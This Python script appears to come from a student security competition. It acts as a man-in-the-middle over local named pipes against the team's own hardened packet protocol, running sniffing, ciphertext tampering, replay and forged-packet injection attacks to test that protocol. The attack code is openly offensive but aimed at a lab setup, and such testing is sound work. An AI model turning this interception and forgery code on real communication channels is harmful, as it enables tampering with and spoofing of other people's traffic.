#!/usr/bin/env python3
"""
IITI SOC 2026 - PS8 Final Evaluation
SECURE MITM ORCHESTRATOR - Attacks the HARDENED protocol

MODIFIED VERSION:
- Formatted output matching baseline mitm_orchestrator.py (CRC32, stylized logs)
- Auto-creates named pipes if missing
- Remains open forever in the terminal (handles reconnects & idle loops)
"""

import os
import sys
import struct
import time
import argparse
import binascii

PIPE_IN = "/tmp/secure_nodeA_to_attacker"
PIPE_OUT = "/tmp/secure_attacker_to_nodeB"

# --- HARDENED PACKET FORMAT (317 bytes) ---
# header(4) type(1) src(1) dest(1) length(2) seq(4) timestamp(4)
# nonce(12) salt(16, carries HMAC) tag(16, GCM auth tag) payload(256)
PACKET_FORMAT = "<IBBBHII12s16s16s256s"
PACKET_SIZE = struct.calcsize(PACKET_FORMAT)  # 317 bytes


class SecureMitmOrchestrator:
    def __init__(self, mode, inject_msg=None):
        self.mode = mode
        self.inject_msg = inject_msg
        self.replay_cache = []

    def compute_crc32(self, data_bytes):
        """Computes unsigned 32-bit CRC checksum for telemetry logging."""
        return binascii.crc32(data_bytes) & 0xFFFFFFFF

    def ensure_pipes_exist(self):
        """Auto-creates named pipes if they do not exist yet."""
        if not os.path.exists(PIPE_IN):
            os.mkfifo(PIPE_IN)
            print(f"[+] Auto-created missing input pipe: {PIPE_IN}")
        if not os.path.exists(PIPE_OUT):
            os.mkfifo(PIPE_OUT)
            print(f"[+] Auto-created missing output pipe: {PIPE_OUT}")

    def run(self):
        self.ensure_pipes_exist()

        if self.mode == "inject":
            self.execute_standalone_injection()
            return

        print(f"[*] Initializing Active Intercept Layer vs HARDENED protocol. Strategy: [{self.mode.upper()}]")
        print(f"[*] Expected Frame Size: {PACKET_SIZE} Bytes\n")

        print("[*] Opening Channel Read Target (Listening to Node A)...")
        fd_in = os.open(PIPE_IN, os.O_RDONLY)

        print("[*] Opening Channel Write Target (Forwarding to Node B)...")
        fd_out = os.open(PIPE_OUT, os.O_WRONLY)

        print("[+] Proxy routing channels engaged seamlessly.\n")

        while True:
            try:
                raw_packet = os.read(fd_in, PACKET_SIZE)
                if not raw_packet:
                    print("[*] Stream terminated by Sender. Awaiting reconnection context...")
                    os.close(fd_in)
                    fd_in = os.open(PIPE_IN, os.O_RDONLY)
                    time.sleep(0.5)
                    continue

                if len(raw_packet) < PACKET_SIZE:
                    print(f"[-] Received incomplete frame ({len(raw_packet)}/{PACKET_SIZE} bytes). Skipping...")
                    continue

                (magic, ptype, src_id, dest_id, length, seq, timestamp,
                 nonce, salt, tag, payload) = struct.unpack(PACKET_FORMAT, raw_packet)

                crc = self.compute_crc32(raw_packet)

                # Matching baseline mitm_orchestrator.py display structure
                print("\033[94m" + "=" * 60)
                print(f"[INTERCEPTED FRAME] Sequence Index: {seq}")
                print(f"  ├── Magic Identifier : {hex(magic).upper()}")
                print(f"  ├── Source Node ID   : {src_id}")
                print(f"  ├── Destination ID   : {dest_id}")
                print(f"  ├── Packet Type Tag  : {ptype}")
                print(f"  ├── Ciphertext Hex   : {payload[:24].hex()}... ({length} Bytes Payload)")
                print(f"  ├── AES Nonce (12B)  : {nonce.hex()}")
                print(f"  ├── HMAC / Salt(16B) : {salt.hex()}")
                print(f"  ├── GCM Tag (16B)    : {tag.hex()}")
                
                if self.mode == "sniff":
                    try:
                        decoded_attempt = payload[:length].decode("utf-8")
                        print(f"  ├── [!] Decoded Payload Text : \"{decoded_attempt}\"")
                    except UnicodeDecodeError:
                        print("  ├── [+] Confidentiality Check : Encrypted Ciphertext (Not valid UTF-8 text)")

                print(f"  └── Computed Telemetry CRC32 : {hex(crc).upper()}")
                print("=" * 60 + "\033[0m")

                if self.mode == "replay":
                    self.replay_cache.append(raw_packet)
                    print(f"[+] Replay Subsystem: Cached valid {PACKET_SIZE}-byte encrypted frame.\n")

                if self.mode == "tamper":
                    print(f"\n\033[91m[!] TAMPER MODE: Modifying ciphertext bytes to attack integrity...")
                    mutated_payload = bytearray(payload)
                    if length > 0:
                        mutated_payload[0] ^= 0xFF
                    print(f"  ├── Mutator: Modified byte offset 0 in ciphertext block.")
                    print(f"  └── Structure Pack: Forwarding corrupted {PACKET_SIZE}-byte frame to Node B.\033[0m\n")
                    raw_packet = struct.pack(PACKET_FORMAT, magic, ptype, src_id, dest_id,
                                              length, seq, timestamp, nonce, salt, tag,
                                              bytes(mutated_payload))

                os.write(fd_out, raw_packet)

                if self.mode == "replay" and self.replay_cache:
                    time.sleep(2)
                    print("\n\033[33m[!] REPLAY ATTACK EXECUTION: Re-injecting historical state frame...")
                    try:
                        os.write(fd_out, self.replay_cache[0])
                        print("    └── [SUCCESS] Duplicate sequence packet pushed to Node B.\033[0m\n")
                    except BrokenPipeError:
                        print("    └── [❌ FAILURE] Broken Pipe! Node B exited early or didn't run in a loop.\033[0m\n")
                    self.replay_cache.clear()

            except KeyboardInterrupt:
                print("\n[*] Intercept routine terminated cleanly by user.")
                break
            except Exception as e:
                print(f"[-] Runtime processing error encountered: {e}")
                time.sleep(1)

        try:
            os.close(fd_in)
            os.close(fd_out)
        except Exception:
            pass

    def execute_standalone_injection(self):
        """ATTACK CLASS 4: forged packet injection."""
        self.ensure_pipes_exist()

        print(f"[*] Initializing Forged Packet Injection Engine vs HARDENED protocol...")
        print(f"[*] Bypassing Node A entirely. Establishing target channel access link...")

        try:
            fd_out = os.open(PIPE_OUT, os.O_WRONLY)

            fake_msg = self.inject_msg.encode("utf-8", errors="ignore")
            fake_len = len(fake_msg)
            fake_payload = fake_msg.ljust(256, b"\x00")
            fake_nonce = os.urandom(12)
            fake_salt = os.urandom(16)
            fake_tag = os.urandom(16)

            packet = struct.pack(PACKET_FORMAT, 0xABCD1234, 1, 1, 2, fake_len, 1337, 0,
                                  fake_nonce, fake_salt, fake_tag, fake_payload)

            print("\n\033[95m" + "!" * 60)
            print(f"[PACKET FORGERY DISPATCHED] Sending Unauthorized Structural Payload")
            print(f"  ├── Forged Message Body : \"{self.inject_msg}\"")
            print(f"  └── Total Outflow Frame : {len(packet)} Bytes Packed")
            print("!" * 60 + "\033[0m\n")

            os.write(fd_out, packet)
            os.close(fd_out)

        except Exception as e:
            print(f"[-] Critical injection processing crash occurred: {e}")

        # Keep process alive forever in terminal after injection
        print("[*] Injection loop complete. Terminal remaining open/active. Press Ctrl+C to terminate.")
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            print("\n[*] Orchestrator exited.")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="IITI SOC 2026 Track 3 Cyber Engine (Hardened)")
    parser.add_argument("--mode", choices=["sniff", "tamper", "replay", "inject"], required=True)
    parser.add_argument("--message", type=str, default="FORGED COMMAND FROM ATTACKER",
                        help="Data block payload for injection runs.")
    args = parser.parse_args()

    engine = SecureMitmOrchestrator(mode=args.mode, inject_msg=args.message)
    
    try:
        engine.run()
    except KeyboardInterrupt:
        print("\n[*] Intercept engine closed.")
